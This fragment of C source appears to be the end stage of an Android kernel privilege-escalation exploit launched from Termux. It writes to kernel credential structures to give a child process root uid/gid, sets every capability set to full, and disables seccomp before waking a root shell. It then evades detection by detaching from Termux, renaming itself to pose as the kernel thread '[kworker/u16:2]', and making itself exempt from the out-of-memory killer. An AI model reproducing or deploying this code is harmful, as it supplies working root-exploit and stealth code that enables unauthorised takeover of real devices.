  if (!write_value(child_cred + 0x04, 0)) { pr_error("child uid/gid write failed\n"); }
  record_stage('8');
  pr_success("Child uid=gid=0\n");

  if (!write_value(child_cred + 0x14, 0)) { pr_error("child euid/egid write failed\n"); }
  record_stage('9');
  pr_success("Child euid=egid=0\n");

  if (!write_value(child_cred + 0x24, 0)) { pr_error("child securebits write failed\n"); }
  record_stage('s');
  pr_success("Child securebits=0\n");

  const uint64_t capval = (k_write_value & ~UINT64_C(0xffff)) | UINT64_C(0xffff);
  pr_info("Payload capval=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_cred + 0x38, capval)) { pr_error("child cap_effective write failed\n"); }
  record_stage('b');
  pr_success("Child cap_effective=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_cred + 0x30, capval)) { pr_error("child cap_permitted write failed\n"); }
  record_stage('a');
  pr_success("Child cap_permitted=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_cred + 0x40, capval)) { pr_error("child cap_bset write failed\n"); }
  record_stage('c');
  pr_success("Child cap_bset=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_cred + 0x28, capval)) { pr_error("child cap_inheritable write failed\n"); }
  record_stage('d');
  pr_success("Child cap_inheritable=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_cred + 0x48, capval)) { pr_error("child cap_ambient write failed\n"); }
  record_stage('e');
  pr_success("Child cap_ambient=0x%016llx\n", (unsigned long long)capval);

  if (!write_value(child_task + OFF_TASK_SECCOMP, 0)) {
    pr_error("child seccomp clear failed\n");
  }
  record_stage('f');
  pr_success("Child seccomp mode disabled (task+0x%x)\n", (unsigned)OFF_TASK_SECCOMP);

  TIMER("Exploit complete, waking child shell");
  __atomic_store_n(done_flag, 1, __ATOMIC_RELEASE);
  fflush(stdout);

  if (__orig_stdout >= 0) close(__orig_stdout);
  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);

  // Anti-kill mechanisms:
  // 1. Detach from Termux process group to prevent being killed together
  setsid();
  
  // 2. Disguise as a kernel worker thread to evade Android background cleanup
  prctl(PR_SET_NAME, "[kworker/u16:2]", 0, 0, 0);
  
  // 3. Maximize OOM score adjustment so LMK won't kill us
  int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
  if (oom_fd >= 0) {
      write(oom_fd, "-1000", 5);
      close(oom_fd);
  }

  for (;;) pause();
}